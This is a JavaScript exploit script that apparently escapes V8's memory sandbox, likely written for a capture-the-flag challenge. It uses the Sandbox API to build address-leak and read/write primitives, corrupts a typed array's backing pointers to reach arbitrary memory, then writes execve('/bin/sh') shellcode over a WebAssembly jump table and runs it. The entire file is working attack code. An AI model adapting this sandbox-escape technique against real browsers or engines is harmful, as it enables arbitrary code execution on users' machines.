/* constants */

const kExternalPointerOffset = 0x2c; // offset of external_pointer in JSTypedArray
const kBasePointerOffset = 0x34; // offset of base_pointer in JSTypedArray
const kJumpTableStartOffset = 0x60; // offset of jump_table_start in WasmInstanceObject


/* helpers */

// convert integer to hex string
function hex(i) {
  return `0x${i.toString(16)}`;
}


/* implement sandboxed primitives */

// get address of obj
function addrof(obj) {
  return Sandbox.getAddressOf(obj);
}

// arbitrary address read/write (sandboxed)
function rw_sbx(addr, value = NaN) {
  let view = new DataView(new Sandbox.MemoryView(addr, 8));

  if (Number.isNaN(value)) { // read
    return view.getBigUint64(0, true);
  } else { // write
    view.setBigUint64(0, value, true);
  }
}


/* escape sandbox */

let arr = new BigUint64Array(1);
let arr_addr = addrof(arr);
console.log(`[+] arr_addr == ${hex(arr_addr)}`);

// arbitrary address read/write
function rw(addr, value = NaN) {
  // overwrite external_pointer with addr
  rw_sbx(arr_addr + kExternalPointerOffset, addr);

  // overwrite base_pointer with 0
  let base_pointer = rw_sbx(arr_addr + kBasePointerOffset);
  base_pointer &= 0xffffffff00000000n;
  rw_sbx(arr_addr + kBasePointerOffset, base_pointer);

  if (Number.isNaN(value)) { // read
    return arr[0];
  } else { // write
    arr[0] = value;
  }
}

// create webassembly code space
let wasm_src = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 4, 1, 2, 0, 11]); // wat2wasm pwn.wat
let wasm_module = new WebAssembly.Module(wasm_src);

// get address of jump table
let wasm_instance = new WebAssembly.Instance(wasm_module);
let wasm_instance_addr = addrof(wasm_instance);
console.log(`[+] wasm_instance_addr == ${hex(wasm_instance_addr)}`);
let jump_table_start = rw_sbx(wasm_instance_addr + kJumpTableStartOffset);
console.log(`[+] jump_table_start == ${hex(jump_table_start)}`);

// execve("/bin/sh", 0, 0)
let shellcode = [106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5]; // python3 shellcode.py

// overwrite jump table with shellcode
while (shellcode.length % 8 != 0) { shellcode.push(0x90); }
for (let i = 0; i < shellcode.length / 8; i++) {
  segment = 0x0n;
  for (let j = 0; j < 8; j++) {
    segment += BigInt(shellcode[i * 8 + j]) << BigInt(j * 8);
  }
  rw(jump_table_start + BigInt(i * 8), segment);
}

// execute shellcode
wasm_instance.exports.main();
